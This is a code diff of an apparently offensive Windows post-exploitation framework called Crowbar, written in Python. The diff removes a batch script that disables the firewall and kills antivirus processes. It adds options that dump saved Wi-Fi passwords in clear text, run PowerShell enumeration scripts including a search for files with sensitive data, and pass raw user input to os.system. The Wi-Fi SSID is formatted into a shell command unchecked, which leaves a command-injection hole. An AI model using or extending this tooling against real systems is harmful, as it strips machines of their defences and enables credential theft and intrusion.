@@ -111,6 +111,12 @@ def leavescripts():
 
 
 def scripts():
+    print(''' 
+    +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+    | If a script by any chance happens to not work or you get no results, it's either because the target doesn't have what the script is        |
+    | trying to search for [Example: VNC Passwords from the registry] or the target doesn't have/meet the requirements.                          |
+    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+     
+    ''')
     while True:
         scripts = input("\nScripts (scripts/)\n  |==> ")
         if scripts == "help":
@@ -155,7 +161,7 @@ def scripts():
             | 27. scripts/powershell/list_installed_programs_using_folders                    Lists installed programs using folders.                         |                                                                                              
             | 28. scripts/powershell/list_arp_tables                                          Lists ARP tables.                                               |
             | 29. scripts/powershell/get_iis_config                                           Fetches IIS config.                                             |
-            | 30. scripts/powershell/setup_session_gopher                                     Get saved session information for WinSCP, FileZilla, and RDP.   |                                                             
+            | 30. scripts/powershell/sensitive_data_search                                    A script that searches for files with sensitive data.           |                                                             
             +—————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
             ''')
         elif scripts == "clear":
@@ -209,7 +215,7 @@ def scripts():
                 elif scriptssysdump == "clear":
                     os.system("cls")
                 elif scriptssysdump == "back":
-                    scripts()
+                    leavescripts()
                 else:
                     print("Wrong Command!")
         elif scripts == "use 3":
@@ -251,40 +257,13 @@ def scripts():
                     leavescripts()
                 else:
                     print("Wrong Command!")
-        elif scripts == "4":
-            while True:
-                avbypass = open("scripts/avbypass.bat", "w")
-                avbypass.write(''' 
-                @ echo off
-                rem
-                rem Permanently Kill Anti-Virus
-                net stop â€œSecurity Centerâ€
-                netsh firewall set opmode mode=disable
-                tskill /A av*
-                tskill /A fire*
-                tskill /A anti*
-                cls
-                tskill /A spy*
-                tskill /A bullguard
-                tskill /A PersFw
-                tskill /A KAV*
-                tskill /A ZONEALARM
-                tskill /A SAFEWEB
-                cls
-                tskill /A spy*
-                tskill /A bullguard
-                tskill /A PersFw
-                tskill /A KAV*
-                tskill /A ZONEALARM
-                tskill /A SAFEWEB
-                cls
-                ''')
-                print(''' 
-                +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+ 
-                | For the safety of the machine, this script will not be executed.                                                                           |
-                | However, the script has been generated successfully.                                                                                       |
-                +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                 
-                ''')
+        elif scripts == "use 4":
+            print(''' 
+            +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+ 
+            | For the safety of the machine, this script will not be executed.                                                                           |
+            | However, you can access the file in the '/scripts' folder.                                                                                 |
+            +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                 
+            ''')
         elif scripts == "use 5":
             while True:
                 scriptswifipass = input("\nScripts (scripts/net/dumpwifipass)\n  |==> ")        
@@ -299,7 +278,7 @@ def scripts():
                     ''')
                 elif scriptswifipass == "dump":
                     wifissid = input("\nScripts (Enter the network SSID which you want to dump passwords from)\n  |==> ")
-                    os.system("{}".format(wifissid))
+                    os.system("NETSH WLAN SHOW PROFILE {} KEY=CLEAR".format(wifissid))
                 elif scriptswifipass == "clear":
                     os.system("cls")
                 elif scriptswifipass == "back":
@@ -657,29 +636,155 @@ def scripts():
                     +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                     
                     ''')
                 elif scriptslistunquote == "run":
-                    os.system("echo This feature is coming soon!")
+                    subprocess.call('''powershell.exe Get-Content scripts/unquoteservice.ps1 | PowerShell.exe -noprofile -''', shell=True)
                 elif scriptslistunquote == "clear":
                     os.system("cls")
                 elif scriptslistunquote == "back":
                     leavescripts()
                 else:
                     print("Wrong Command!")
-
-# working on PS script execution
-# coming soon!!!
-
-
-
-
-
-
-
-
-
-
-
-
-
+        elif scripts == "use 24":
+            while True:
+                scriptsroutingtable = input("\nScripts (scripts/powershell/list_routing_tables)\n  |==> ")             
+                if scriptsroutingtable == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           |
+                    | run - Runs the script against the host machine.                                                                                            |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - goes back to the 'Scripts' directory.                                                                                               |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                      
+                    ''')
+                elif scriptsroutingtable == "run":
+                    subprocess.call('''powershell.exe Get-Content scripts/routingtable.ps1 | PowerShell.exe -noprofile -''', shell=True)
+                elif scriptsroutingtable == "clear":
+                    os.system("cls")
+                elif scriptsroutingtable == "back":
+                    leavescripts()
+                else:
+                    print("Wrong Command!")
+        elif scripts == "use 25":
+            while True:
+                scriptsnetworkinter = input("\nScripts (scripts/powershell/list_network_interfaces)\n  |==> ")
+                if scriptsnetworkinter == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           |
+                    | run - Runs the script against the host machine.                                                                                            |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - goes back to the 'Scripts' directory.                                                                                               |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                     
+                    ''')
+                elif scriptsnetworkinter == "run":
+                    subprocess.call('''powershell.exe Get-Content scripts/listnetworkinter.ps1 | PowerShell.exe -noprofile -''', shell=True)
+                elif scriptsnetworkinter == "clear":
+                    os.system("cls")
+                elif scriptsnetworkinter == "back":
+                    leavescripts()
+                else:
+                    print("Wrong Command!")    
+        elif scripts == "use 26":
+            while True:
+                scriptslistinstalledproreg = input("\nScripts (scripts/powershell/list_installed_programs_using_registry)\n  |==> ")
+                if scriptslistinstalledproreg == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           |
+                    | run - Runs the script against the host machine.                                                                                            |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - goes back to the 'Scripts' directory.                                                                                               |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+                     
+                    ''')
+                elif scriptslistinstalledproreg == "run":
+                    subprocess.call('''powershell.exe Get-Content scripts/listprogramsreg.ps1 | PowerShell.exe -noprofile -''', shell=True)
+                elif scriptslistinstalledproreg == "clear":
+                    os.system("cls")
+                elif scriptslistinstalledproreg == "back":
+                    leavescripts()
+                else:
+                    print("Wrong Command!")
+        elif scripts == "use 27":
+            while True:
+                scriptslistinstalledprofol = input("\nScripts (scripts/powershell/list_installed_programs_using_folders)\n  |==> ")
+                if scriptslistinstalledprofol == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           |
+                    | run - Runs the script against the host machine.                                                                                            |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - goes back to the 'Scripts' directory.                                                                                               |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif scriptslistinstalledprofol == "run":
+                    subprocess.call('''powershell.exe Get-Content scripts/listprogramsfol.ps1 | PowerShell.exe -noprofile -''', shell=True)
+                elif scriptslistinstalledprofol == "clear":
+                    os.system("cls")
+                elif scriptslistinstalledprofol == "back":
+                    leavescripts()
+                else:
+                    print("Wrong Command!")
+        elif scripts == "use 28":
+            while True:
+                scriptslistarptables = input("\nScripts (scripts/powershell/list_arp_tables)\n  |==> ")
+                if scriptslistarptables == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           |
+                    | run - Runs the script against the host machine.                                                                                            |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - goes back to the 'Scripts' directory.                                                                                               |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif scriptslistarptables == "run":
+                    subprocess.call('''powershell.exe Get-Content scripts/listarptables.ps1 | PowerShell.exe -noprofile -''', shell=True)
+                elif scriptslistarptables == "clear":
+                    os.system("cls")
+                elif scriptslistarptables == "back":
+                    leavescripts()
+                else:
+                    print("Wrong Command!")
+        elif scripts == "use 29":
+            while True:
+                scriptsgetiisconfig = input("\nScripts (scripts/powershell/get_iis_config)\n  |==> ")
+                if scriptsgetiisconfig == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           |
+                    | run - Runs the script against the host machine.                                                                                            |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - goes back to the 'Scripts' directory.                                                                                               |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif scriptsgetiisconfig == "run":
+                    subprocess.call('''powershell.exe Get-Content scripts/iisconfig.ps1 | PowerShell.exe -noprofile -''', shell=True)
+                elif scriptsgetiisconfig == "clear":
+                    os.system("cls")
+                elif scriptsgetiisconfig == "back":
+                    leavescripts()
+                else:
+                    print("Wrong Command!")
+        elif scripts == "use 30":
+            while True:
+                scriptssensitivedata = input("\nScripts (scripts/powershell/sensitive_data_search)\n  |==> ")
+                if scriptssensitivedata == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           |
+                    | run - Runs the script against the host machine.                                                                                            |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - goes back to the 'Scripts' directory.                                                                                               |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif scriptssensitivedata == "run":
+                    subprocess.call('''powershell.exe Get-Content scripts/sensitive_data_search.ps1 | PowerShell.exe -noprofile -''', shell=True)
+                elif scriptssensitivedata == "clear":
+                    os.system("cls")
+                elif scriptssensitivedata == "back":
+                    leavescripts()
+                else:
+                    print("Wrong Command!")
+        else:
+            print("Wrong Command!")
 
 
 def leaveutil():
@@ -839,7 +944,6 @@ def util():
 def icommand():
     print(''' 
     +——— Help Commands for iCommand —————————————————————————————————————————————————————————————————————————————————————————————————————————————+
-    | cmdhelp - Prints out help commands.                                                                                                        |
     | clear - Clears the screen.                                                                                                                 |
     | back - Goes back to the Crowbar menu.                                                                                                      |
     +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
@@ -852,7 +956,20 @@ def icommand():
             os.system("py main.py")
         os.system("{}".format(icommandin))
 
-        
+def ipower():
+    print(''' 
+    +——— Help Commands for iPower ———————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+    | clear - Clears the screen.                                                                                                                 |
+    | back - Goes back to the Crowbar menu.                                                                                                      |
+    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+    
+    ''')
+    while True:
+        ipower = input("\niPower (Type the command you want execute)\n  |==> ")
+        if ipower == "clear":
+            os.system("cls")
+        elif ipower == "back":
+            os.system("py main.py")
+        os.system("{}".format(ipower))    
 
 def mainmenuinput():
     while True:
@@ -863,9 +980,8 @@ def mainmenuinput():
             | help - Prints out help commands. (This is for the entire framework)                                                                        |
             | dir util - Goes into the 'Util' directory.                                                                                                 |   
             | dir scripts - Goes into the 'Scripts' directory.                                                                                           |
-            | dir generator - Goes into the 'Generator' directory.                                                                                       |
-            | /generator - Lets you execute and read generated files.                                                                                    |
-            | command - Loads the 'iCommand' tool for executing OS commands.                                                                             |
+            | command - Loads the 'iCommand' tool for executing OS commands via CMD.                                                                     |
+            | power - Loads the 'iPower' tool for executing OS commands via PowerShell.                                                                  |
             | crowbar - Reloads the framework.                                                                                                           |           
             | clear - Clears the screen. (This is for the entire framework)                                                                              |
             +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
@@ -874,12 +990,10 @@ def mainmenuinput():
             util()
         elif mainmenu == "dir scripts":
             scripts()
-        elif mainmenu == "dir generator":
-            generatordir()
-        elif mainmenu == "/generator":
-            generatordir()
         elif mainmenu == "command":
             icommand()
+        elif mainmenu == "power":
+            ipower()
         elif mainmenu == "crowbar":
             os.system("py main.py")
         elif mainmenu == "clear":
